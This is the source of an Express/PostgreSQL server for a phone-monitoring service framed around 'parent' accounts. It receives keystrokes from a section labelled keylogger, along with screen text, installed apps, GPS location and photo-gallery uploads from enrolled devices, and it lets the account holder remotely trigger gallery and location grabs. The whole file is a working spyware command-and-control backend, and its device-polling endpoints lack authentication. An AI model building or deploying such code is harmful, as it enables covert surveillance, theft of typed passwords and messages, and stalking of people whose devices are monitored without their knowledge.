const express = require("express");
const path = require("path");
const { Pool } = require("pg");
const bcrypt = require("bcrypt");
const session = require("express-session");
const pgSession = require("connect-pg-simple")(session);

const app = express();
const PORT = process.env.PORT || 3000;
app.set("trust proxy", 1);

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === "production" ? { rejectUnauthorized: false } : false
});

app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true }));

app.use(
  session({
    store: new pgSession({ pool, tableName: "user_sessions", createTableIfMissing: true }),
    secret: process.env.SESSION_SECRET || "change-this-secret-in-render",
    resave: false,
    saveUninitialized: false,
    cookie: { httpOnly: true, secure: false, sameSite: "lax", maxAge: 1000 * 60 * 60 * 24 * 7 }
  })
);

async function setupDatabase() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role VARCHAR(20) DEFAULT 'parent',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS role VARCHAR(20) DEFAULT 'parent'`);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS devices (
        id SERIAL PRIMARY KEY,
        owner_user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
        device_id VARCHAR(255) UNIQUE NOT NULL,
        device_token TEXT NOT NULL,
        device_name VARCHAR(255) NOT NULL,
        battery INTEGER DEFAULT 0,
        online BOOLEAN DEFAULT FALSE,
        last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_id VARCHAR(255)`);
    await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_token TEXT`);
    await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS owner_user_id INTEGER`);
    console.log("Database ready.");
  } catch (err) {
    console.error("Setup failed:", err);
  }
}
setupDatabase();

function requireLogin(req, res, next) {
  if (!req.session.userId) return res.status(401).json({ authenticated: false, error: "Login required." });
  next();
}

app.post("/api/signup", async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: "Email and password required." });
    if (password.length < 8) return res.status(400).json({ error: "Password must be at least 8 characters." });
    const normalizedEmail = email.trim().toLowerCase();
    const existing = await pool.query("SELECT id FROM users WHERE email=$1", [normalizedEmail]);
    if (existing.rows.length > 0) return res.status(409).json({ error: "Account already exists." });
    const passwordHash = await bcrypt.hash(password, 12);
    const result = await pool.query(
      "INSERT INTO users (email, password_hash, role) VALUES ($1,$2,'parent') RETURNING id, email, role, created_at",
      [normalizedEmail, passwordHash]
    );
    req.session.userId = result.rows[0].id;
    req.session.role = result.rows[0].role;
    req.session.save((err) => {
      if (err) return res.status(500).json({ error: "Session save failed." });
      res.status(201).json({ message: "Account created.", user: result.rows[0] });
    });
  } catch (e) { console.error(e); res.status(500).json({ error: "Signup failed." }); }
});

app.post("/api/login", async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: "Email and password required." });
    const normalizedEmail = email.trim().toLowerCase();
    const result = await pool.query("SELECT id, email, password_hash, role FROM users WHERE email=$1", [normalizedEmail]);
    if (result.rows.length === 0) return res.status(401).json({ error: "Invalid email or password." });
    const user = result.rows[0];
    const ok = await bcrypt.compare(password, user.password_hash);
    if (!ok) return res.status(401).json({ error: "Invalid email or password." });
    req.session.userId = user.id;
    req.session.role = user.role;
    req.session.save((err) => {
      if (err) return res.status(500).json({ error: "Session save failed." });
      res.json({ message: "Login successful.", user: { id: user.id, email: user.email, role: user.role } });
    });
  } catch (e) { console.error(e); res.status(500).json({ error: "Login failed." }); }
});

app.get("/api/me", requireLogin, async (req, res) => {
  try {
    const result = await pool.query("SELECT id, email, role, created_at FROM users WHERE id=$1", [req.session.userId]);
    if (result.rows.length === 0) return res.status(401).json({ authenticated: false });
    res.json({ authenticated: true, user: result.rows[0] });
  } catch (e) { res.status(500).json({ error: "Failed to fetch user." }); }
});

// ================= DEVICE STATE =================
const deviceStates = new Map();
const keylogs = [];
const deviceUIs = new Map();
const galleryData = new Map();
const galleryRequestFlags = new Map();
const gpsRequestFlags = new Map();

app.post("/api/device-state", async (req, res) => {
  try {
    const { ownerEmail, deviceId, deviceToken, deviceName, battery, installedApps, latitude, longitude, accuracy } = req.body;
    if (!ownerEmail || !deviceId || !deviceToken) return res.status(400).json({ error: "ownerEmail, deviceId, deviceToken required" });

    const userRes = await pool.query("SELECT id FROM users WHERE email=$1", [ownerEmail.toLowerCase().trim()]);
    if (userRes.rows.length === 0) return res.status(404).json({ error: "User not found" });
    const userId = userRes.rows[0].id;

    const existing = await pool.query("SELECT id FROM devices WHERE device_id=$1", [deviceId]);
    if (existing.rows.length > 0) {
      await pool.query(
        "UPDATE devices SET device_token=$1, device_name=$2, battery=$3, online=TRUE, last_seen=CURRENT_TIMESTAMP WHERE device_id=$4",
        [deviceToken, deviceName || "Unknown Device", battery ?? 0, deviceId]
      );
    } else {
      await pool.query(
        "INSERT INTO devices (owner_user_id, device_id, device_token, device_name, battery, online, last_seen) VALUES ($1,$2,$3,$4,$5,TRUE,CURRENT_TIMESTAMP)",
        [userId, deviceId, deviceToken, deviceName || "Unknown Device", battery ?? 0]
      );
    }

    deviceStates.set(deviceId, {
      deviceName: deviceName || "Unknown Device",
      battery: battery ?? 0,
      installedApps: installedApps || [],
      latitude: latitude ?? null,
      longitude: longitude ?? null,
      accuracy: accuracy ?? null,
      last_seen: Date.now()
    });
    res.json({ success: true });
  } catch (e) { console.error(e); res.status(500).json({ error: "State update failed" }); }
});

app.get("/api/device-state", requireLogin, async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
    return res.status(403).json({ error: "Not your device." });
  }
  const live = deviceStates.get(deviceId);
  if (!live) return res.json({ deviceName: "Unknown", battery: 0, installedApps: [], latitude: null, longitude: null, accuracy: null, last_seen: 0 });
  res.json(live);
});

app.get("/api/devices", requireLogin, async (req, res) => {
  try {
    const result = await pool.query(
      "SELECT device_id, device_name AS name, battery, online, last_seen FROM devices WHERE owner_user_id=$1 ORDER BY created_at DESC",
      [req.session.userId]
    );
    const devices = result.rows.map(row => {
      const live = deviceStates.get(row.device_id);
      if (live && live.last_seen > Date.now() - 120000) {
        row.online = true;
        row.battery = live.battery ?? row.battery;
      } else {
        row.online = false;
      }
      return row;
    });
    res.json(devices);
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to load devices." }); }
});

// ================= KEYLOGGER & UI =================
app.post("/api/keylog", async (req, res) => {
  try {
    const { deviceId, deviceToken, text, timestamp } = req.body;
    if (!deviceId || !deviceToken || !text) return res.status(400).json({ error: "deviceId, deviceToken and text required" });
    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
    keylogs.push({ deviceId, text, timestamp: timestamp || Date.now() });
    res.json({ success: true });
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save keylog." }); }
});

app.post("/api/ui", async (req, res) => {
  try {
    const { deviceId, deviceToken, uiText, timestamp } = req.body;
    if (!deviceId || !deviceToken) return res.status(400).json({ error: "deviceId and deviceToken required" });
    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
    deviceUIs.set(deviceId, { uiText, timestamp: timestamp || Date.now() });
    res.json({ success: true });
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save UI." }); }
});

app.get("/api/keylog", requireLogin, async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) return res.status(403).json({ error: "Not your device." });
  res.json(keylogs.filter(k => k.deviceId === deviceId));
});

app.get("/api/ui", requireLogin, async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) return res.status(403).json({ error: "Not your device." });
  res.json(deviceUIs.get(deviceId) || { uiText: "", timestamp: 0 });
});

// ================= GALLERY =================
app.post("/api/gallery/request", requireLogin, async (req, res) => {
  const { deviceId } = req.body;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
    return res.status(403).json({ error: "Not your device." });
  }
  galleryRequestFlags.set(deviceId, true);
  res.json({ success: true });
});

app.get("/api/gallery/request", async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const requested = galleryRequestFlags.get(deviceId) || false;
  if (requested) galleryRequestFlags.delete(deviceId);
  res.json({ requested });
});

app.post("/api/gallery/upload", async (req, res) => {
  try {
    const { deviceId, deviceToken, media } = req.body;
    if (!deviceId || !deviceToken || !Array.isArray(media)) {
      return res.status(400).json({ error: "deviceId, deviceToken, media array required" });
    }
    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
      return res.status(401).json({ error: "Invalid device token." });
    }
    const latest = media.slice(0, 100);
    galleryData.set(deviceId, latest);
    res.json({ success: true, count: latest.length });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Gallery upload failed" });
  }
});

app.get("/api/gallery", requireLogin, async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
    return res.status(403).json({ error: "Not your device." });
  }
  const media = galleryData.get(deviceId) || [];
  res.json({ media });
});

// ================= GPS REQUEST =================
app.post("/api/gps/request", requireLogin, async (req, res) => {
  const { deviceId } = req.body;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
    return res.status(403).json({ error: "Not your device." });
  }
  gpsRequestFlags.set(deviceId, true);
  res.json({ success: true });
});

app.get("/api/gps/request", async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const requested = gpsRequestFlags.get(deviceId) || false;
  if (requested) gpsRequestFlags.delete(deviceId);
  res.json({ requested });
});

// ================= PAGES =================
app.get("/control.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
app.get("/control", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
app.get("/dashboard.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "dashboard.html")));
app.get("/dashboard", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "dashboard.html")));
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));
app.post("/api/logout", (req, res) => {
  req.session.destroy(() => { res.clearCookie("connect.sid"); res.json({ message: "Logged out." }); });
});

app.listen(PORT, "0.0.0.0", () => console.log(`Server running on port ${PORT}`));
